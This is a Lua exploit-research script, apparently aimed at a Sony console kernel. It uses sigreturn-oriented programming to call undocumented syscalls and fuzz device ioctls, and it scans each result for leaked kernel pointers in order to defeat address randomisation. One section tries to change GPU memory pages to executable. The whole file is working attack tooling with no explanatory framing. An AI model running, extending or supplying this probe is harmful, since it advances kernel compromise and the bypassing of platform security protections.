-- CRASH_CLASS: MODERATE
-- PROBE 137a: Contract-informed syscall scan via SROP
--
-- The community contributed 13.60 argument contracts for 145 Sony syscalls.
-- Key untested targets:
--   sys 547: VM region query (addr, user_region) → copyout 0x18 bytes
--   sys 653: GPU page table attribute modifier (1 arg)
--   sys 654: 64KiB VM object range operation (5 args)
--   sys 659: module handle enumeration v2 (handles_out, capacity, count_out)
--   sys 660: module info v2 (module_handle, slot_padding, info_inout)
--   sys 662: AIO batch delete (ids, count, results) — NOT sys 661!
--   sys 663: AIO batch wait (ids, count, states, wait_mode, timeout_inout)
--   sys 664: AIO batch poll (ids, count, states)
--   sys 667: enumerate process/thread records
--   sys 538-546: event flag objects
-- Also: ioctl catalog codes from 13.60 via SROP

print("=== PROBE 137a: CONTRACT SCAN ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local pid = to_num(sc20())
print("pid=" .. pid)

local MC = 0x40
local ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(ctx)) end)
local rip = memory.read_qword(ctx + MC + 0xA0)
local rh, rl = get_hi_lo(rip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(ctx)) end)
    memory.write_qword(ctx + MC + 0xA0, sc_addr)
    memory.write_qword(ctx + MC + 0x38, uint64(num))
    if a1 then memory.write_qword(ctx + MC + 0x08, a1) end
    if a2 then memory.write_qword(ctx + MC + 0x10, a2) end
    if a3 then memory.write_qword(ctx + MC + 0x18, a3) end
    if a4 then memory.write_qword(ctx + MC + 0x50, a4) end
    if a5 then memory.write_qword(ctx + MC + 0x28, a5) end
    if a6 then memory.write_qword(ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(ctx)) end)
    return rv
end

local sc_mmap = make_syscall(477)
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x40000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))
local function ua(v) return uint64(string.format("0x%X", to_num(v))) end
local function ws(buf, s)
    for i = 1, #s do memory.write_byte(buf+i-1, string.byte(s,i)) end
    memory.write_byte(buf+#s, 0)
end
local function zero(addr, len)
    for off = 0, len - 1, 4 do memory.write_dword(addr + off, 0) end
end
local function kptr_scan(addr, len, label)
    local found = 0
    for off = 0, len - 4, 8 do
        local v = safe_rq(addr + off)
        if v then
            local vh, vl = get_hi_lo(v)
            if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                print(string.format("  *** KPTR %s+0x%02X: %s ***", label, off, hex(v)))
                found = found + 1
            end
        end
    end
    return found
end
local function dump_nonzero(addr, len, label)
    for off = 0, len - 4, 8 do
        local v = safe_rq(addr + off)
        if v then
            local vh, vl = get_hi_lo(v)
            if vh > 0 or vl > 0 then
                print(string.format("  %s+0x%02X: %s", label, off, hex(v)))
            end
        end
    end
end

-- Get eboot text base for VM region query targets
local info = memory.alloc(0x200)
local sc593 = make_syscall(593)
for off = 0, 0x1FF, 4 do memory.write_dword(info + off, 0) end
memory.write_dword(info, 0x160)
pcall(function() sc593(uint64(0), uint64(string.format("0x%X", to_num(info)))) end)
local text_lo = to_num(memory.read_dword(info + 0x108))
local text_hi = to_num(memory.read_dword(info + 0x10C))
local eboot_base = uint64(string.format("0x%X%08X", text_hi, text_lo))
print("eboot=" .. hex(eboot_base))

--------------------------------------------------------------------
-- SECTION A: sys 547 — VM region query (MOST PROMISING for KASLR)
-- Contract: 2 args (address, user_region), copyout 0x18 bytes
-- The backing vm_object pointer in the output might be a kernel addr
--------------------------------------------------------------------
print("")
print("--- [A] sys 547: VM region query ---")

local buf = gpu + 0x100
local kfound = 0

-- Query various address ranges
local targets = {}
table.insert(targets, {name="eboot", addr=eboot_base})
table.insert(targets, {name="gpu", addr=ua(gpu)})
table.insert(targets, {name="stack", addr=uint64("0x7EF1C0000")})
table.insert(targets, {name="zero", addr=uint64(0)})
table.insert(targets, {name="low", addr=uint64(0x10000)})

-- Also try libkernel base if we can get it
for off = 0, 0x1FF, 4 do memory.write_dword(info + off, 0) end
memory.write_dword(info, 0x160)
pcall(function() sc593(uint64(1), uint64(string.format("0x%X", to_num(info)))) end)
local lk_lo = to_num(memory.read_dword(info + 0x108))
local lk_hi = to_num(memory.read_dword(info + 0x10C))
if lk_hi > 0 or lk_lo > 0 then
    local lk_base = uint64(string.format("0x%X%08X", lk_hi, lk_lo))
    table.insert(targets, {name="libkernel", addr=lk_base})
    print("[A] libkernel=" .. hex(lk_base))
end

for _, t in ipairs(targets) do
    zero(buf, 0x80)
    local rv = srop(547, t.addr, ua(buf))
    local rvh, rvl = get_hi_lo(rv)
    print(string.format("[A] 547(%s) rv=%s", t.name, hex(rv)))
    if rvl == 0 and rvh == 0 then
        print("[A] OUTPUT (0x18 bytes):")
        dump_nonzero(buf, 0x40, "547")
        kfound = kfound + kptr_scan(buf, 0x40, "547")
    end
end
print("[A] kptrs=" .. kfound)
print("[A] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION B: sys 653 — GPU/Display Page Table Attribute Modifier
-- Contract: 1 arg. If this can change page attributes to executable...
--------------------------------------------------------------------
print("")
print("--- [B] sys 653: GPU PT modifier ---")

-- Try with GPU mmap address — maybe we can make it executable
local rv653 = srop(653, ua(gpu))
print("[B] 653(gpu_addr)=" .. hex(rv653))

-- Try with the GPU page count / size as argument
rv653 = srop(653, uint64(0))
print("[B] 653(0)=" .. hex(rv653))
rv653 = srop(653, uint64(1))
print("[B] 653(1)=" .. hex(rv653))
rv653 = srop(653, uint64(7))
print("[B] 653(7)=" .. hex(rv653))
print("[B] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION C: sys 659/660 — module handle enumeration v2
-- 659: handles_out, capacity, count_out
-- 660: module_handle, slot_padding, info_inout
--------------------------------------------------------------------
print("")
print("--- [C] sys 659/660: module v2 ---")

local handles_buf = gpu + 0x200
local count_buf = gpu + 0x280
zero(handles_buf, 0x80)
zero(count_buf, 0x10)

-- 659: enumerate module handles
local rv659 = srop(659, ua(handles_buf), uint64(32), ua(count_buf))
print("[C] 659(enum) rv=" .. hex(rv659))
local r659h, r659l = get_hi_lo(rv659)
if r659l == 0 and r659h == 0 then
    local cnt = to_num(memory.read_dword(count_buf))
    print("[C] module count=" .. cnt)
    for i = 0, math.min(cnt, 16) - 1 do
        local h = to_num(memory.read_dword(handles_buf + i * 4))
        print(string.format("[C]   handle[%d]=%d", i, h))
    end
    kptr_scan(handles_buf, 0x80, "659")
end

-- 660: module info v2 for handle 0 (eboot)
local info2_buf = gpu + 0x300
zero(info2_buf, 0x200)
memory.write_dword(info2_buf, 0x200) -- size field
local rv660 = srop(660, uint64(0), uint64(0), ua(info2_buf))
print("[C] 660(0,info) rv=" .. hex(rv660))
local r660h, r660l = get_hi_lo(rv660)
if r660l == 0 and r660h == 0 then
    print("[C] info v2 output:")
    dump_nonzero(info2_buf, 0x100, "660")
    kfound = kfound + kptr_scan(info2_buf, 0x200, "660")
end
print("[C] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION D: sys 662-664 — AIO batch (NOT 661!)
-- 662: batch delete (ids, count, results)
-- 663: batch wait (ids, count, states, wait_mode, timeout_inout)
-- 664: batch poll (ids, count, states)
-- These are separate from the lethal 661
--------------------------------------------------------------------
print("")
print("--- [D] sys 662-664: AIO batch ---")

local aio_ids = gpu + 0x500
local aio_results = gpu + 0x580
local aio_states = gpu + 0x600
zero(aio_ids, 0x40)
zero(aio_results, 0x40)
zero(aio_states, 0x80)

-- 664: batch poll with count=0 (safe probe)
local rv664 = srop(664, ua(aio_ids), uint64(0), ua(aio_states))
print("[D] 664(poll,0) rv=" .. hex(rv664))

-- 662: batch delete with count=0
local rv662 = srop(662, ua(aio_ids), uint64(0), ua(aio_results))
print("[D] 662(del,0) rv=" .. hex(rv662))

-- 663: batch wait with count=0, mode=0, no timeout
local rv663 = srop(663, ua(aio_ids), uint64(0), ua(aio_states), uint64(0), uint64(0))
print("[D] 663(wait,0,0) rv=" .. hex(rv663))

-- Try 664 with count=1, id=0
memory.write_dword(aio_ids, 0)
zero(aio_states, 0x80)
rv664 = srop(664, ua(aio_ids), uint64(1), ua(aio_states))
print("[D] 664(poll,1) rv=" .. hex(rv664))
if to_num(rv664) == 0 then
    dump_nonzero(aio_states, 0x40, "664")
    kptr_scan(aio_states, 0x40, "664")
end
print("[D] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION E: sys 667 — enumerate process/thread records
-- Contract: count-only mode available
--------------------------------------------------------------------
print("")
print("--- [E] sys 667: process/thread enum ---")

local enum_buf = gpu + 0x700
zero(enum_buf, 0x200)

-- Try with count-only mode first (pass NULL buffer?)
local rv667 = srop(667, uint64(0), uint64(0), uint64(0))
print("[E] 667(null,0,0)=" .. hex(rv667))

-- Try with buffer
rv667 = srop(667, ua(enum_buf), uint64(0x200), uint64(0))
print("[E] 667(buf,0x200,0)=" .. hex(rv667))
local r667h, r667l = get_hi_lo(rv667)
if r667l == 0 and r667h == 0 then
    print("[E] output:")
    dump_nonzero(enum_buf, 0x100, "667")
    kfound = kfound + kptr_scan(enum_buf, 0x200, "667")
end

-- Try different arg layouts
rv667 = srop(667, ua(enum_buf), uint64(pid), uint64(0x200))
print("[E] 667(buf,pid,0x200)=" .. hex(rv667))
r667h, r667l = get_hi_lo(rv667)
if r667l == 0 and r667h == 0 then
    dump_nonzero(enum_buf, 0x80, "667b")
    kptr_scan(enum_buf, 0x200, "667b")
end
print("[E] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION F: sys 538-542 — Event flag objects
-- 538: create (user_name, attributes, initial_pattern) → might return handle
-- 542: wait (handle, pattern, mode, observed, timeout) → copyout 0x20
--------------------------------------------------------------------
print("")
print("--- [F] sys 538: event flags ---")

local name_buf = gpu + 0x900
ws(name_buf, "test_evf")

-- 538: create event flag
local rv538 = srop(538, ua(name_buf), uint64(0), uint64(0))
print("[F] 538(create)=" .. hex(rv538))
local r538h, r538l = get_hi_lo(rv538)
local evf_handle = r538l

-- If we got a handle, try poll (543: handle, pattern, mode, observed)
if r538l > 0 and r538l < 0x10000 and r538h == 0 then
    print("[F] evf handle=" .. evf_handle)
    local obs_buf = gpu + 0x940
    zero(obs_buf, 0x20)

    -- 543: poll (non-blocking)
    local rv543 = srop(543, uint64(evf_handle), uint64(1), uint64(0), ua(obs_buf))
    print("[F] 543(poll)=" .. hex(rv543))
    dump_nonzero(obs_buf, 0x20, "543")
    kptr_scan(obs_buf, 0x20, "543")

    -- 544: set bits
    local rv544 = srop(544, uint64(evf_handle), uint64(0xFFFFFFFF))
    print("[F] 544(set)=" .. hex(rv544))

    -- 543 again after set
    zero(obs_buf, 0x20)
    rv543 = srop(543, uint64(evf_handle), uint64(1), uint64(0), ua(obs_buf))
    print("[F] 543(poll2)=" .. hex(rv543))
    dump_nonzero(obs_buf, 0x20, "543b")

    -- 539: delete
    local rv539 = srop(539, uint64(evf_handle))
    print("[F] 539(del)=" .. hex(rv539))
end
print("[F] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION G: sys 654 — 64KiB VM object range operation
-- Contract: 5 args (descriptor, flags, user_operations, count, user_processed)
-- Different from sys 548 — might have different W^X checks
--------------------------------------------------------------------
print("")
print("--- [G] sys 654: VM range op ---")

local ops_buf = gpu + 0xA00
zero(ops_buf, 0x40)

-- Try with GPU descriptor
local rv654 = srop(654, uint64(0), uint64(0), ua(ops_buf), uint64(0), ua(count_buf))
print("[G] 654(0,0,ops,0) rv=" .. hex(rv654))

-- Try with flags
rv654 = srop(654, ua(gpu), uint64(1), ua(ops_buf), uint64(0x10000), ua(count_buf))
print("[G] 654(gpu,1,ops,64K) rv=" .. hex(rv654))

-- sys 655: companion reset
local rv655 = srop(655, uint64(0), uint64(0), uint64(0))
print("[G] 655(0,0,0) rv=" .. hex(rv655))
print("[G] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION H: sys 657 — batched memory commands
-- Contract: commands, count, processed_count, flags
--------------------------------------------------------------------
print("")
print("--- [H] sys 657: batch memcmd ---")

local cmd_buf = gpu + 0xB00
local proc_buf = gpu + 0xB80
zero(cmd_buf, 0x80)
zero(proc_buf, 0x10)

-- Count=0 probe
local rv657 = srop(657, ua(cmd_buf), uint64(0), ua(proc_buf), uint64(0))
print("[H] 657(cmd,0,proc,0) rv=" .. hex(rv657))

-- Try count=1 with zeroed command
rv657 = srop(657, ua(cmd_buf), uint64(1), ua(proc_buf), uint64(0))
print("[H] 657(cmd,1,proc,0) rv=" .. hex(rv657))
print("[H] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION I: ioctl via SROP on openable /dev nodes
-- Use 13.60 catalog codes that might work on 14.10
--------------------------------------------------------------------
print("")
print("--- [I] ioctl catalog via SROP ---")

local path_buf = gpu + 0xC00
local ioctl_buf = gpu + 0xD00
zero(ioctl_buf, 0x200)

-- Open /dev/gc (GPU compute)
ws(path_buf, "/dev/gc")
local fd_gc = srop(5, ua(path_buf), uint64(2))
print("[I] /dev/gc fd=" .. hex(fd_gc))

-- Open /dev/dce (display compositor)
ws(path_buf, "/dev/dce")
local fd_dce = srop(5, ua(path_buf), uint64(2))
print("[I] /dev/dce fd=" .. hex(fd_dce))

-- Open /dev/notification0
ws(path_buf, "/dev/notification0")
local fd_not = srop(5, ua(path_buf), uint64(2))
print("[I] /dev/notification0 fd=" .. hex(fd_not))

-- Open /dev/camera
ws(path_buf, "/dev/camera")
local fd_cam = srop(5, ua(path_buf), uint64(2))
print("[I] /dev/camera fd=" .. hex(fd_cam))

-- Open /dev/ajm (audio)
ws(path_buf, "/dev/ajm")
local fd_ajm = srop(5, ua(path_buf), uint64(2))
print("[I] /dev/ajm fd=" .. hex(fd_ajm))

-- Try real ioctl codes from 13.60 catalog on each open fd
local codes = {
    -- Group S (0x53): camera/sensor
    0x40845301, 0x40845303, 0xC0845301, 0xC0845302,
    -- Group A (0x41): audio/ajm
    0x40084105, 0x40084106, 0x40084108,
    0x80044103, 0x8004410C, 0x8004410E,
    -- Group t (0x74): tty/terminal
    0x40047400, 0x40047401, 0x40047402, 0x40047403,
    0x80047401, 0x80047402,
    -- Group H (0x48): HID
    0x80044808,
    -- Group U (0x55): USB
    0x40205505, 0x80045501, 0x80045502,
    -- Group D (0x44): display/dce
    0x40144401, 0x40184402, 0xC00C440D, 0xC00C440E,
    -- Group O (0x4F): generic
    0x20004F00, 0x20004F01,
}

local fds = {}
local fd_names = {}
local function add_fd(name, fd_val)
    local fh, fl = get_hi_lo(fd_val)
    if fl > 0 and fl < 256 and fh == 0 then
        table.insert(fds, fl)
        table.insert(fd_names, name)
    end
end
add_fd("gc", fd_gc)
add_fd("dce", fd_dce)
add_fd("notification0", fd_not)
add_fd("camera", fd_cam)
add_fd("ajm", fd_ajm)

print("[I] open fds: " .. #fds)
for i, fd in ipairs(fds) do
    print(string.format("[I]   %s fd=%d", fd_names[i], fd))
end

local hits = 0
for _, code in ipairs(codes) do
    for i, fd in ipairs(fds) do
        zero(ioctl_buf, 0x200)
        local rv_io = srop(54, uint64(fd), uint64(code), ua(ioctl_buf))
        local ioh, iol = get_hi_lo(rv_io)
        if iol == 0 and ioh == 0 then
            hits = hits + 1
            print(string.format("[I] *** HIT: %s(fd=%d) code=0x%08X ret=0 ***",
                fd_names[i], fd, code))
            -- Dump output
            dump_nonzero(ioctl_buf, 0x40, string.format("io_%X", code))
            kfound = kfound + kptr_scan(ioctl_buf, 0x200, string.format("io_%X", code))
        end
    end
end
print("[I] ioctl hits=" .. hits)

-- Close fds
for _, fd in ipairs(fds) do
    srop(6, uint64(fd))
end
print("[I] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION J: sys 646/647 — credential-gated queries
--------------------------------------------------------------------
print("")
print("--- [J] sys 646/647: cred-gated ---")

local cred_buf = gpu + 0xE00
zero(cred_buf, 0x100)
local rv646 = srop(646, ua(cred_buf))
print("[J] 646(buf)=" .. hex(rv646))
local r646h, r646l = get_hi_lo(rv646)
if r646l == 0 and r646h == 0 then
    dump_nonzero(cred_buf, 0x80, "646")
    kfound = kfound + kptr_scan(cred_buf, 0x100, "646")
end

zero(cred_buf, 0x100)
local rv647 = srop(647, ua(cred_buf))
print("[J] 647(buf)=" .. hex(rv647))
local r647h, r647l = get_hi_lo(rv647)
if r647l == 0 and r647h == 0 then
    dump_nonzero(cred_buf, 0x80, "647")
    kfound = kfound + kptr_scan(cred_buf, 0x100, "647")
end
print("[J] pid=" .. to_num(sc20()))

print("")
print("TOTAL kptrs found=" .. kfound)
print("pid=" .. to_num(sc20()))
print("=== DONE ===")
